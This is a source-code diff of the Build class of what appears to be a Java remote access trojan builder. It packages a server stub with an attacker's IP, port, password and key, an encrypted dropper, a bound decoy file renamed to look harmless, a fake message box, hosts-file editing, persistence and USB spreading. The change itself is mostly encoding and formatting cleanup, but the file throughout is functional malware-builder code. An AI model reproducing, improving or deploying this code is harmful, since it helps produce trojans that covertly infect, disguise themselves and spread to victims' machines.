@@ -43,13 +43,13 @@ public class Build {
 	}
 
 	@SuppressWarnings("resource")
-	public static void build(BuildListener listener, File buildFrom, File file, String ip, int port, String ID, String pass, String key, boolean dropper, String droppath, int reconSec, String name, boolean fakewindow, String faketitle, String fakemessage, int fakeicon, boolean melt, boolean hiddenFile, boolean bind, String bindpath, String bindname, String droptarget, boolean mutex, int mutexport, PluginList pluginlist, boolean timeout, int timeoutms, boolean delay, int delayms, boolean edithost, String hosttext, boolean overwritehost, boolean trayicon, String icon, String traymsg, String traymsgfail, String traytitle, boolean handleerr, boolean persistance, int persistancems, boolean usb, String usbexclude, String usbname, boolean debugmsg, OSConfig osconfig, boolean summary) {		
+	public static void build(BuildListener listener, File buildFrom, File file, String ip, int port, String ID, String pass, String key, boolean dropper, String droppath, int reconSec, String name, boolean fakewindow, String faketitle, String fakemessage, int fakeicon, boolean melt, boolean hiddenFile, boolean bind, String bindpath, String bindname, String droptarget, boolean mutex, int mutexport, PluginList pluginlist, boolean timeout, int timeoutms, boolean delay, int delayms, boolean edithost, String hosttext, boolean overwritehost, boolean trayicon, String icon, String traymsg, String traymsgfail, String traytitle, boolean handleerr, boolean persistance, int persistancems, boolean usb, String usbexclude, String usbname, boolean debugmsg, OSConfig osconfig, boolean summary) {
 		listener.start();
-		
+
 		if (!file.getName().toLowerCase().endsWith(".jar")) {
 			file = new File(file.getAbsolutePath() + ".jar");
 		}
-		
+
 		ZipFile inputStub = null;
 		ZipOutputStream outputStub = null;
 		ZipEntry entry = null;
@@ -81,8 +81,7 @@ public class Build {
 			}
 
 			listener.reportProgress(30, "Writing config", BuildStatus.INFO);
-			
-			
+
 			try {
 				entry = new ZipEntry("config.dat");
 				outputStub.putNextEntry(entry);
@@ -131,7 +130,6 @@ public class Build {
 					throw ex;
 				}
 			}
-			
 
 			if (trayicon) {
 				InputStream trayIcon = null;
@@ -151,7 +149,7 @@ public class Build {
 			try {
 				entry = new ZipEntry("key.dat");
 				outputStub.putNextEntry(entry);
-				outputStub.write(key.getBytes());
+				outputStub.write(key.getBytes("UTF-8"));
 				outputStub.closeEntry();
 			} catch (Exception ex) {
 				if (ex instanceof ZipException && ex.getMessage().contains("duplicate entry")) {
@@ -161,18 +159,17 @@ public class Build {
 				}
 			}
 
-			
 			String[] plugins = null;
-			
-			if (pluginlist != null) {			
+
+			if (pluginlist != null) {
 				plugins = new String[pluginlist.plugins.size()];
 				listener.reportProgress(50, "Writing plugins...", BuildStatus.INFO);
-				
+
 				for (int i = 0; i < pluginlist.plugins.size(); i++) {
 					ExternalPlugin p = pluginlist.plugins.get(i);
 					JarFile plugin = new JarFile(p.path);
 					entries = plugin.entries();
-					
+
 					while (entries.hasMoreElements()) {
 						entry = entries.nextElement();
 
@@ -201,18 +198,18 @@ public class Build {
 				entry = new ZipEntry("plugins.dat");
 				outputStub.putNextEntry(entry);
 				for (int i = 0; i < plugins.length; i++) {
-					outputStub.write((Crypto.encrypt(plugins[i], key) + ",").getBytes());
+					outputStub.write((Crypto.encrypt(plugins[i], key) + ",").getBytes("UTF-8"));
 				}
 				outputStub.closeEntry();
 			}
 
 			inputStub.close();
-			outputStub.close();	
+			outputStub.close();
 
 			if (dropper) {
 				listener.reportProgress(50, "Writing server into dropper", BuildStatus.INFO);
-				String installerKey = key; 
-				
+				String installerKey = key;
+
 				FileCrypter.encrypt(tempStubCleanJar, tempCryptedNotRunnableJar, installerKey);
 
 				inputStub = new ZipFile(Files.getInstaller());
@@ -237,15 +234,15 @@ public class Build {
 				}
 
 				entry = new ZipEntry("enc.dat");
-				
+
 				outputStub.putNextEntry(entry);
 				copy(new FileInputStream(tempCryptedNotRunnableJar), outputStub);
 				outputStub.closeEntry();
-				
+
 				entry = new ZipEntry("key.dat");
-		
-				outputStub.putNextEntry(entry);								
-				
+
+				outputStub.putNextEntry(entry);
+
 				outputStub.write(encodeLine(installerKey));
 				outputStub.write(encodeLine(droppath));
 				outputStub.write(encodeLine(name));
@@ -259,30 +256,31 @@ public class Build {
 				outputStub.write(encodeLine(hiddenFile));
 
 				outputStub.closeEntry();
-				
+
 				listener.reportProgress(75, "Wrote key and data", BuildStatus.CHECK);
-				
-				
-				
+
 				if (bind) {
 					File bindFile = new File(bindpath);
-					entry = new ZipEntry(bindFile.getName());
+					String extension = bindFile.getName().substring(bindFile.getName().lastIndexOf("."), bindFile.getName().length());
+					
+					entry = new ZipEntry(bindname + extension);		
 					outputStub.putNextEntry(entry);
+					
 					FileInputStream fis = new FileInputStream(bindpath);
 					copy(fis, outputStub);
 					outputStub.closeEntry();
+					
 					fis.close();
 
 					listener.reportProgress(90, "Writing file to bind", BuildStatus.INFO);
 
 					entry = new ZipEntry("bind.dat");
 					outputStub.putNextEntry(entry);
-					outputStub.write((Hex.encode(droptarget) + "\n").getBytes());
-					outputStub.write((Hex.encode(bindname) + "\n").getBytes());
-					outputStub.write((Hex.encode(bindFile.getName().substring(bindFile.getName().lastIndexOf("."), bindFile.getName().length())) + "\n").getBytes());
-					outputStub.write((Hex.encode(bindFile.getName()) + "\n").getBytes());
+					outputStub.write(encodeLine(droptarget));
+					outputStub.write(encodeLine(bindname));
+					outputStub.write(encodeLine(extension));
 					outputStub.closeEntry();
-					
+
 					listener.reportProgress(90, "Wrote file to bind", BuildStatus.CHECK);
 
 				}
@@ -291,12 +289,12 @@ public class Build {
 			}
 
 			long end = System.currentTimeMillis();
-			
+
 			listener.reportProgress(95, "MD5 of file: " + Md5.md5(file), BuildStatus.INFO);
 			listener.reportProgress(95, "SHA1 of file: " + Sha1.sha1(file), BuildStatus.INFO);
-			
+
 			listener.done("Saved Server. Took " + (end - start) + " ms, size " + (file.length() / 1024L) + " kB");
-			
+
 			FrameSummary frame = new FrameSummary(file, ip, port, pass, key, ID, listener.getStatuses());
 			frame.setVisible(true);
 		} catch (Exception ex) {
@@ -309,12 +307,12 @@ public class Build {
 				inputStub.close();
 			} catch (Exception ex1) {
 			}
-			
+
 			ex.printStackTrace();
 			listener.fail(message);
 			ErrorDialog.create(ex);
 		}
-		
+
 		try {
 			tempCryptedNotRunnableJar.delete();
 			tempStubCleanJar.delete();
@@ -322,16 +320,15 @@ public class Build {
 			ex1.printStackTrace();
 		}
 	}
-	
+
 	public static byte[] encode(String s) throws Exception {
 		s = Hex.encode(s);
 		s = Base64.encode(s);
-		return s.getBytes();
-	}
-	
-	public static byte[] encodeLine(Object obj) throws Exception {
-		return (new String(encode(obj.toString())) + ",").getBytes();
+		return s.getBytes("UTF-8");
 	}
 
-	
+	public static byte[] encodeLine(Object obj) throws Exception {
+		return (new String(encode(obj.toString())) + ",").getBytes("UTF-8");
+	}
+
 }
